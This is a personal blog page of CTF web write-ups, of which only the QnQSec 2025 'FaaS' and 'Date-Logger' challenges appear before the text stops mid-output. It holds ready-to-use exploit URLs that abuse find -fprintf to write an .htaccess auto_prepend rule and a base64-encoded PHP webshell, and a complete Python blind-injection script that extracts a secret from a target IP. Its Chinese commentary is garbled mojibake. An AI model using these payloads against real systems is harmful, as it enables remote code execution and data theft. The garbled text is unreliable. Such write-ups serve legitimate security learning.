<!DOCTYPE html>
<html lang=en>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="QnQSec CTF 2025 web FaaS123456789101112131415161718&amp;lt;?php    $cmd = $_GET[&apos;cmd&apos;];    if (!isset($cmd)) &amp;#123;        highlight_file(__FILE__) &amp;amp;&amp;amp; die();    &amp;#125;        if (strpos($cmd, &quot;;&quot;)">
<meta property="og:type" content="article">
<meta property="og:title" content="Some CTF">
<meta property="og:url" content="http://yoursite.com/2025/10/18/QnQSecctf2025/index.html">
<meta property="og:site_name" content="Deen&#39;s blog">
<meta property="og:description" content="QnQSec CTF 2025 web FaaS123456789101112131415161718&amp;lt;?php    $cmd = $_GET[&apos;cmd&apos;];    if (!isset($cmd)) &amp;#123;        highlight_file(__FILE__) &amp;amp;&amp;amp; die();    &amp;#125;        if (strpos($cmd, &quot;;&quot;)">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://lh3.googleusercontent.com/d/1PjncwFhY-OSydH8jPX6ETNnOKmrHfnLa">
<meta property="og:image" content="https://lh3.googleusercontent.com/d/1KD1GTWcsKWSMFbeyaG43OjqyB0CtKP3Z">
<meta property="og:image" content="https://lh3.googleusercontent.com/d/1hl5Q1CVxMcj2pG2ytGSYjTz_6_Xkft8E">
<meta property="og:image" content="https://lh3.googleusercontent.com/d/1YopmG6r9INKHmKJ6iD_EMiLhH_Yv3EYQ">
<meta property="og:image" content="https://lh3.googleusercontent.com/d/1TgSelSPpFjnHfzwrcPZt0dRJifhJNKyW">
<meta property="og:image" content="https://lh3.googleusercontent.com/d/1Qbx0NKlBt7drVni9d2QEiidFOTb-4PEk">
<meta property="og:updated_time" content="2025-12-12T10:19:37.158Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Some CTF">
<meta name="twitter:description" content="QnQSec CTF 2025 web FaaS123456789101112131415161718&amp;lt;?php    $cmd = $_GET[&apos;cmd&apos;];    if (!isset($cmd)) &amp;#123;        highlight_file(__FILE__) &amp;amp;&amp;amp; die();    &amp;#125;        if (strpos($cmd, &quot;;&quot;)">
<meta name="twitter:image" content="https://lh3.googleusercontent.com/d/1PjncwFhY-OSydH8jPX6ETNnOKmrHfnLa">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/d33n.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/d33n.jpg">
          
        
    
    <!-- title -->
    <title>Some CTF</title>
    <!-- styles -->
    <link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/lib/meslo-LG/styles.css">
    <link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
    <link rel="stylesheet" href="/css/style.css">
    <!-- rss -->
    
    
    <!-- jquery -->
    <script src="/lib/jquery/jquery.min.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<meta name="theme-color" content="#000000">
<body>
    
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="background">
      
        <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2025/12/08/react2shll/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
        
        
        <li><a class="icon" href="/2025/08/31/blob/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
        <!-- <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li> -->
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <!-- <span id="i-share" class="info" style="display:none;">Share post</span> -->
    </span>
    <br/>
    <!-- <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2025/10/18/QnQSecctf2025/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&text=Some CTF"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&title=Some CTF"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&is_video=false&description=Some CTF"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Some CTF&body=Check out this article: http://yoursite.com/2025/10/18/QnQSecctf2025/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&title=Some CTF"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&title=Some CTF"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&title=Some CTF"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&title=Some CTF"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&name=Some CTF&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div> -->
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#QnQSec-CTF-2025-web-FaaS"><span class="toc-number">1.</span> <span class="toc-text">QnQSec CTF 2025 web FaaS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QnQSec-CTF-2025-web-Date-Logger"><span class="toc-number">2.</span> <span class="toc-text">QnQSec CTF 2025 web  Date-Logger</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#N1CTF-2025-eezzjs"><span class="toc-number">3.</span> <span class="toc-text">N1CTF 2025 eezzjs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AmateursCTF-2025-web-desafe"><span class="toc-number">4.</span> <span class="toc-text">AmateursCTF 2025 web/desafe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PwnSec-CTF-2025-A-Very-Safe-Locker-Indeed"><span class="toc-number">5.</span> <span class="toc-text">PwnSec CTF 2025 | A Very Safe Locker Indeed</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PwnSec-CTF-2025-OhMyPP"><span class="toc-number">6.</span> <span class="toc-text">PwnSec CTF 2025 | OhMyPP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PwnSec-CTF-2025-FireLeak"><span class="toc-number">7.</span> <span class="toc-text">PwnSec CTF 2025 | FireLeak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PwnSec-CTF-2025-PSPD"><span class="toc-number">8.</span> <span class="toc-text">PwnSec CTF 2025 | PSPD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PwnSec-CTF-2025-MaxPayne"><span class="toc-number">9.</span> <span class="toc-text">PwnSec CTF 2025 | MaxPayne</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Devil-Net-v2"><span class="toc-number">10.</span> <span class="toc-text">Devil Net v2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Backup"><span class="toc-number">11.</span> <span class="toc-text">Backup</span></a></li></ol>
    </div>
  </span>
</div>

      
      <div class="content index width mx-auto px2 my4">
          
          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Some CTF
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Deen's blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2025-10-18T22:31:22.000Z" itemprop="datePublished">2025-10-18</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="QnQSec-CTF-2025-web-FaaS"><a href="#QnQSec-CTF-2025-web-FaaS" class="headerlink" title="QnQSec CTF 2025 web FaaS"></a>QnQSec CTF 2025 web FaaS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($cmd)) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>) &amp;&amp; <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (strpos($cmd, <span class="string">";"</span>) !== <span class="keyword">False</span> || strpos($cmd, <span class="string">"|"</span>) !== <span class="keyword">False</span> || strpos($cmd, <span class="string">"$"</span>) !== <span class="keyword">False</span> ||</span><br><span class="line">    strpos($cmd, <span class="string">"`"</span>) !== <span class="keyword">False</span> || strpos($cmd, <span class="string">"&amp;"</span>) !== <span class="keyword">False</span> || strpos($cmd, <span class="string">"\n"</span>) !== <span class="keyword">False</span> ||</span><br><span class="line">    strpos($cmd, <span class="string">"&gt;"</span>) !== <span class="keyword">False</span> || strpos($cmd, <span class="string">"&lt;"</span>) !== <span class="keyword">False</span> || strpos($cmd, <span class="string">"("</span>) !== <span class="keyword">False</span> ||</span><br><span class="line">    strpos($cmd, <span class="string">")"</span>) !== <span class="keyword">False</span> || strpos($cmd, <span class="string">" "</span>) !== <span class="keyword">False</span> || strpos($cmd, <span class="string">"\r"</span>) !== <span class="keyword">False</span> ||</span><br><span class="line">    strpos($cmd, <span class="string">"+"</span>) !== <span class="keyword">False</span> || strpos($cmd, <span class="string">"&#123;"</span>) !== <span class="keyword">False</span> || strpos($cmd, <span class="string">"&#125;"</span>) !== <span class="keyword">False</span> ||</span><br><span class="line">    strpos($cmd, <span class="string">"["</span>) !== <span class="keyword">False</span> || strpos($cmd, <span class="string">"]"</span>) !== <span class="keyword">False</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bad bad hacker :&lt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $cmd = <span class="string">"find "</span> . $cmd;</span><br><span class="line">    system($cmd);</span><br></pre></td></tr></table></figure>

<p>åˆ†æå¹¶å°è¯•ä¹‹åå¾—å‡ºå‡ ä¸ªå¯ä»¥ç¡®å®šçš„ç‚¹ï¼š</p>
<ul>
<li>è¿‡æ»¤äº†çš„è¿™äº›å­—ç¬¦ï¼Œæ— æ³•å®ç°å¦èµ·ä¸€ä¸ªå‘½ä»¤</li>
<li>-execè¿™æ¡è·¯èµ°ä¸é€š</li>
</ul>
<p>ç„¶åä¸€ç•ªæŸ¥æ‰¾æ‰¾åˆ° -fprintf è¿™ä¸ªä¸œè¥¿ï¼Œé€šè¿‡find -fprintf å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶å†™å…¥ã€‚</p>
<p>é‚£å‰©ä¸‹å°±æ˜¯ä»»æ„å†™å…¥æ–‡ä»¶æ¼æ´çš„æ”»å‡»ã€‚ç»è¿‡å°è¯•ä¹‹ååˆå¯ä»¥åˆ†æå‡ºå‡ ç‚¹ï¼š</p>
<ul>
<li>è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œæ— æ³•ç›´æ¥å†™å…¥PHPæ–‡ä»¶</li>
<li>æ— æ³•å†™å…¥å®šæ—¶ä»»åŠ¡</li>
</ul>
<p>æœ€åé€šè¿‡.htaccess ç»è¿‡ä¸€ä¸ªbase64.</p>
<p>htaccessçš„å†…å®¹ï¼š</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-decode/resource=<span class="keyword">a</span>.jpg</span><br></pre></td></tr></table></figure>

<p>å†å†™å…¥ä¸€ä¸ªa.jpgçš„shell</p>
<p><code>http://161.97.155.116:8888/?cmd=/bin/whoami%09-fprintf%09.htaccess%09&quot;php_value%09auto_prepend_file%09php://filter/read=convert.base64-decode/resource=a.jpg&quot;</code></p>
<p><code>http://161.97.155.116:8888/?cmd=/bin/whoami%09-fprintf%09a.jpg%09&quot;PD9waHAKaWYgKGlzc2V0KCRfR0VUWydjJ10pKSB7CiAgICBAc3lzdGVtKCRfR0VUWydjJ10pOwp9&quot;&amp;c=/readflag%20i%20want%20the%20flag%20please</code></p>
<p><code>QnQSec{big_thanks_2_ğŸŠ_4876three}</code></p>
<p>å¤§éƒ¨åˆ†äººç”¨çš„fprintfæ”¯æŒ8ç¦æ­¢ç¼–ç è§£çš„ã€‚</p>
<h2 id="QnQSec-CTF-2025-web-Date-Logger"><a href="#QnQSec-CTF-2025-web-Date-Logger" class="headerlink" title="QnQSec CTF 2025 web  Date-Logger"></a>QnQSec CTF 2025 web  Date-Logger</h2><p>ä¼ å…¥ä¸€ä¸ªè¶…å¤§çš„PHPSESSID=8889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988891;</p>
<p>ä¼šè§¦å‘æœåŠ¡ç«¯æŠ¥é”™ã€‚</p>
<blockquote>
<p><b>Warning</b>:  session_destroy(): Trying to destroy uninitialized session in <b>/var/www/html/index.php</b> on line <b></b></p>
</blockquote>
<p>ç›´æ¥ç›²æ³¨</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># -- é…ç½®åŒº --</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡URL</span></span><br><span class="line">URL = <span class="string">"http://161.97.155.116:8889/"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»ä½ çš„è¯·æ±‚ä¸­å¤åˆ¶çš„HTTPå¤´éƒ¨ä¿¡æ¯</span></span><br><span class="line"><span class="comment"># æ³¨æ„ï¼šContent-Length å’Œ Host é€šå¸¸ç”±requestsåº“è‡ªåŠ¨ç®¡ç†ï¼Œè¿™é‡Œå¯ä»¥çœç•¥</span></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line">    <span class="string">'Origin'</span>: <span class="string">'http://161.97.155.116:8889'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">'http://161.97.155.116:8889/'</span>,</span><br><span class="line">    <span class="comment"># å°†ä½ æä¾›çš„å®Œæ•´Cookieæ”¾åœ¨è¿™é‡Œ</span></span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988898889888988891;'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, br'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'en,zh-CN;q=0.9,zh-HK;q=0.8,zh;q=0.7'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -- è„šæœ¬æ ¸å¿ƒé€»è¾‘ --</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_blind_injection</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    æ‰§è¡Œå¸ƒå°”ç›²æ³¨æ”»å‡»æ¥è·å–flagï¼Œå°è¯•æ‰€æœ‰å¯è§çš„ASCIIå­—ç¬¦ã€‚</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># å®šä¹‰flagä¸­å¯èƒ½å‡ºç°çš„å­—ç¬¦é›† (æ‰€æœ‰å¯è§çš„ASCIIå­—ç¬¦)</span></span><br><span class="line">    <span class="comment"># string.printable åŒ…å«å­—æ¯ã€æ•°å­—ã€æ ‡ç‚¹ç¬¦å·å’Œç©ºç™½å­—ç¬¦</span></span><br><span class="line">    <span class="comment"># æˆ‘ä»¬é€šå¸¸åœ¨flagä¸­ä¸éœ€è¦ç©ºç™½å­—ç¬¦ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨ string.ascii_letters, string.digits, å’Œ string.punctuation</span></span><br><span class="line">    charset = string.ascii_letters + string.digits + string.punctuation + <span class="string">'&#123;&#125;'</span>  <span class="comment"># ç¡®ä¿å¤§æ‹¬å·åœ¨å†…</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># æˆ–è€…ï¼Œä½¿ç”¨ASCIIç èŒƒå›´ç”Ÿæˆå­—ç¬¦é›†</span></span><br><span class="line">    <span class="comment"># charset = ''.join(chr(i) for i in range(32, 127))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–å·²çŸ¥çš„flagå‰ç¼€å’Œsession</span></span><br><span class="line">    known_flag = <span class="string">"QnQSec&#123;f_u_linux_"</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[*] å¼€å§‹è¿›è¡Œå¸ƒå°”ç›²æ³¨æ”»å‡»..."</span>)</span><br><span class="line">    print(<span class="string">f"[*] å·²çŸ¥å‰ç¼€: <span class="subst">&#123;known_flag&#125;</span>"</span>)</span><br><span class="line">    print(<span class="string">f"[*] å°†ä¼šå°è¯•çš„å­—ç¬¦é›†: <span class="subst">&#123;charset&#125;</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¾ªç¯ç›´åˆ°æ‰¾åˆ°ç»“æŸç¬¦ '&#125;'</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> known_flag.endswith(<span class="string">'&#125;'</span>):</span><br><span class="line">        found_next_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char_to_guess <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="comment"># æ„é€ æœ¬æ¬¡çŒœæµ‹çš„payload</span></span><br><span class="line">            payload = known_flag + char_to_guess</span><br><span class="line"></span><br><span class="line">            <span class="comment"># å‡†å¤‡POSTçš„æ•°æ®</span></span><br><span class="line">            post_data = &#123;<span class="string">'search'</span>: payload&#125;</span><br><span class="line"></span><br><span class="line">            print(<span class="string">f"\r[*] æ­£åœ¨å°è¯•: <span class="subst">&#123;payload.ljust(<span class="number">60</span>)&#125;</span>"</span>, end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># å‘é€POSTè¯·æ±‚</span></span><br><span class="line">                response = session.post(URL, headers=HEADERS, data=post_data, timeout=<span class="number">10</span>)</span><br><span class="line">                response.raise_for_status()  <span class="comment"># å¦‚æœè¯·æ±‚å¤±è´¥ (ä¾‹å¦‚ 404, 500), æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># å…³é”®åˆ¤æ–­ï¼šæ£€æŸ¥å“åº”ä¸­æ˜¯å¦åŒ…å« "session_destroy" å…³é”®å­—</span></span><br><span class="line">                <span class="comment"># è¿™ä¸ªå…³é”®å­—è¡¨ç¤ºæˆ‘ä»¬çš„çŒœæµ‹æ˜¯æ­£ç¡®çš„</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">'session_destroy'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                    known_flag += char_to_guess</span><br><span class="line">                    print(<span class="string">f"\n[+] å­—ç¬¦æ‰¾åˆ°! å½“å‰Flag: <span class="subst">&#123;known_flag&#125;</span>"</span>)</span><br><span class="line">                    found_next_char = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span>  <span class="comment"># è·³å‡ºå†…å±‚å¾ªç¯ï¼Œå¼€å§‹çŒœä¸‹ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">                print(<span class="string">f"\n[!] è¯·æ±‚è¶…æ—¶: æ­£åœ¨å°è¯• '<span class="subst">&#123;payload&#125;</span>'"</span>)</span><br><span class="line">                print(<span class="string">"[*] å¯èƒ½æ˜¯ç½‘ç»œé—®é¢˜æˆ–æœåŠ¡å™¨å“åº”æ…¢ï¼Œç»§ç»­å°è¯•ä¸‹ä¸€ä¸ªå­—ç¬¦..."</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">f"\n[!] è¯·æ±‚å‡ºé”™: <span class="subst">&#123;e&#125;</span>"</span>)</span><br><span class="line">                print(<span class="string">"[*] è„šæœ¬å°†åœ¨5ç§’åé‡è¯•..."</span>)</span><br><span class="line">                time.sleep(<span class="number">5</span>)</span><br><span class="line">                <span class="keyword">continue</span>  <span class="comment"># è·³è¿‡æ­¤æ¬¡å¾ªç¯</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¦‚æœéå†å®Œæ‰€æœ‰å­—ç¬¦éƒ½æ²¡æ‰¾åˆ°ï¼Œè¯´æ˜å­—ç¬¦é›†ä¸å…¨æˆ–é€»è¾‘æœ‰è¯¯</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_next_char:</span><br><span class="line">            print(<span class="string">"\n[!] æ— æ³•æ‰¾åˆ°ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚å¯èƒ½çš„åŸå› ï¼š"</span>)</span><br><span class="line">            print(<span class="string">"    1. ç›®æ ‡flagåŒ…å«çš„å­—ç¬¦ä¸åœ¨å½“å‰å­—ç¬¦é›†ä¸­ã€‚"</span>)</span><br><span class="line">            print(<span class="string">"    2. æ”»å‡»é€»è¾‘å¤±æ•ˆæˆ–å·²è¢«ä¿®å¤ã€‚"</span>)</span><br><span class="line">            print(<span class="string">"    3. ç½‘ç»œè¿æ¥ä¸ç¨³å®šã€‚"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"\n[+] æ”»å‡»å®Œæˆ!"</span>)</span><br><span class="line">    <span class="keyword">if</span> known_flag.endswith(<span class="string">'&#125;'</span>):</span><br><span class="line">        print(<span class="string">f"[*] æœ€ç»ˆæ‰¾åˆ°çš„Flagæ˜¯: <span class="subst">&#123;known_flag&#125;</span>"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">f"[*] æ”»å‡»ä¸­æ­¢ï¼Œå½“å‰å·²æ‰¾åˆ°çš„éƒ¨åˆ†: <span class="subst">&#123;known_flag&#125;</span>"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    solve_blind_injection()</span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> æ­£åœ¨å°è¯•: <span class="selector-tag">QnQSec</span>&#123;<span class="attribute">f_u_linux_</span>:sad:!                                     </span><br><span class="line">[+] å­—ç¬¦æ‰¾åˆ°! å½“å‰Flag: QnQSec&#123;f_u_linux_:sad:!</span><br><span class="line">[*] æ­£åœ¨å°è¯•: QnQSec&#123;f_u_linux_:sad:!&#125;                                    </span><br><span class="line"><span class="selector-attr">[+]</span> å­—ç¬¦æ‰¾åˆ°! å½“å‰<span class="selector-tag">Flag</span>: <span class="selector-tag">QnQSec</span>&#123;<span class="attribute">f_u_linux_</span>:sad:!&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span> æ”»å‡»å®Œæˆ!</span><br><span class="line"><span class="selector-attr">[*]</span> æœ€ç»ˆæ‰¾åˆ°çš„<span class="selector-tag">Flag</span>æ˜¯: <span class="selector-tag">QnQSec</span>&#123;<span 